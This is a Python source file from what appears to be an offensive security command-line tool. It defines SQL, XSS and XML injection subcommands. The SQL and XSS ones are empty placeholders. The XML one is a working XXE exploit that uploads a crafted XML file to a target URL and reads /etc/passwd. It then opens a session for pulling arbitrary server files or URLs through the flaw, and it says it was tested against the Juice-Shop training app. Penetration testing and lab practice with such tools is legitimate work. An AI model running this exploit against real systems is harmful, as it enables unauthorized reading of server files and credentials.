import html
from http import HTTPMethod
import pathlib
import re
import tempfile
from typing import Annotated, Literal, Optional
import requests
import typer
from urllib3.util import parse_url
from cveforge import tcve_command, tcve_option, Context
from cveforge.core.commands.executables.owasp.injections.xml import XMLSession


@tcve_command(categories=["cwe-91", "cwe-611", "cwe-776", "cwe-643"])
def inject():
    """OWASP Injection Command"""
    pass


@tcve_option(inject, is_command=True)
def sql(target: str = typer.Option(..., help="Target URL for SQL Injection")):
    """Perform SQL Injection Test"""
    typer.echo(f"Performing SQL Injection test on {target}")
    # Placeholder for actual SQL injection logic
    pass


@tcve_option(inject, is_command=True)
def xss(target: str = typer.Option(..., help="Target URL for XSS Injection")):
    """Perform XSS Injection Test"""
    typer.echo(f"Performing XSS Injection test on {target}")
    # Placeholder for actual XSS injection logic
    pass


@tcve_option(inject, is_command=True)
def xml(
    target: str = typer.Argument(help="Target URL for XML Injection"),
    headers: Annotated[Optional[list[str,]], typer.Option("--header", "-H")] = None,
    cookies: Annotated[Optional[str], typer.Option("--cookies", "-b")] = None,
    custom_payload: Annotated[Optional[str], typer.Option("--payload", "-f")] = None,
    method: Annotated[
        Literal[
            HTTPMethod.POST,
            HTTPMethod.PATCH,
            HTTPMethod.CONNECT,
            HTTPMethod.DELETE,
            HTTPMethod.GET,
            HTTPMethod.TRACE,
            HTTPMethod.HEAD,
            HTTPMethod.OPTIONS,
        ],
        typer.Option(
            "-X",
            "--method",
        ),
    ] = HTTPMethod.POST,
    file_name: str = typer.Option(default="file"),
    proxy: Optional[str] = typer.Option(default=None),
    path: Optional[str] = typer.Argument(default=None),
    verbose: bool = typer.Option(default=False)
):
    """
    Perform XML Injection on a given endpoint
    usage:
    ```sh
    inject xml http://localhost:3000/file-upload
    ```
    defaults:
        :method: POST
    The above enables a session that can be worked on commands like ls and cd can be used there
    Tested against Juice-Shop
    """
    typer.echo(f"Performing XML Injection test on {target}")
    context = Context()
    url = parse_url(target)
    # Placeholder for actual XML injection logic
    r_headers: dict[str, str] = {}
    if headers:
        for header in headers:
            key, value = header.split(":", 1)
            r_headers[key.strip()] = value.strip()
    r_cookies: dict[str, str] = {}
    if cookies:
        r_cookies = dict(
            [cookie.strip().split("=", 1) for cookie in cookies.split(";")]
        )
    if url.host:
        r_headers["Origin"] = url.host
        r_headers["Referer"] = target
    r_headers["Accept"] = "*/*"

    def _request(path: str):
        file = tempfile.TemporaryFile(mode="w+b")

        if custom_payload:
            formatted_injection = custom_payload
        else:
            injector_xml = context.PAYLOAD_DIR_SRC / "cwe/91/injector.xml"
            injector_code = injector_xml.open("rb")
            formatted_injection = injector_code.read().decode()
            injector_code.close()
        formatted_injection = formatted_injection.format(PATH=path)
        file.write(formatted_injection.encode())
        file.seek(0)
        response = requests.request(
            method=method,
            url=target,
            headers=r_headers,
            cookies=r_cookies,
            files={file_name: ("file.xml", file, "text/xml")},
            proxies={"http": proxy} if proxy else None,
        )
        file.close()
        return response

    response = _request("file:///etc/passwd")
    matches = re.search(
        r"[\w]+:[\w]+:[\w]+:[\w]+:[\w]+:[\w\\/-_\ ]+:[\w\\/-_\ ]+", response.text
    )
    if matches:
        prefix: bytes = response.content[0 : matches.start()]
        suffix: bytes = response.content[matches.end() :]

        # content = response.content.removeprefix(prefix).removesuffix(suffix)
        def _transform_response(response: requests.Response, path: str):
            pattern = r"{}.*?\(file\.xml\)".format(re.escape(path))
            content = re.search(pattern, response.text)
            if content:
                content = content[0]
                content = html.unescape(
                    content.removeprefix(path).removesuffix("(file.xml)").strip()
                )
                content = content[content.index("<foo>") + 5 : -6]
                print(content)
            else:
                print("Command not worked")
                if verbose:
                    print("Full Response: ", response.text)
            return content

        if path:
            if path.startswith(("file", "http", "ftp", "tcp")):
                response = _request(path)
                _transform_response(response, path)
            else:
                try:
                    pth = "file://" + str(pathlib.Path(path))
                    response = _request(pth)
                    _transform_response(response, path)
                except Exception:
                    response = _request(path)
                    _transform_response(response, path)
        else:
            pass
        context.set_current_session(
            XMLSession(
                prefix=prefix,
                suffix=suffix,
                protocol="http+xml",
                hostname=url.hostname,
                port=url.port,
                path=url.path,
            )
        )
